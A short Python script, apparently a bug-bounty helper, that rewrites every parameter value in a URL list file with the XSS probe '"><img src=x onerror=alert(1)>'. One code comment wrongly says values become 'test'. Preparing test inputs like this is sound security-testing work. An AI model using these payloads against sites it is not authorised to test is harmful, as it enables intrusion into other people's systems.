import re
import os
import sys

def replace_parameter_values(file_path):
    with open(file_path, 'r', encoding='utf-8') as file:
        content = file.read()

    # Define the pattern for finding parameter values (assuming they are alphanumeric)
    pattern = re.compile(r'(?<=\=)([^&\s]+)')

    # Replace parameter values with "test"
    modified_content = re.sub(pattern, '"><img src=x onerror=alert(1)>', content)

    with open(file_path, 'w', encoding='utf-8') as file:
        file.write(modified_content)

if __name__ == "__main__":
    # Check if a command-line argument is provided
    if len(sys.argv) != 3 or sys.argv[1] != "-l":
        print("Usage: python replacer.py -l [list.txt]")
        sys.exit(1)

    # Get the file path from the command-line argument
    list_file = sys.argv[2]

    # Check if the specified file exists
    if not os.path.exists(list_file):
        print(f"Error: File '{list_file}' not found.")
        sys.exit(1)

    # Replace parameter values in the specified .txt file
    replace_parameter_values(list_file)
    print(f"Parameter values replaced in {list_file}")
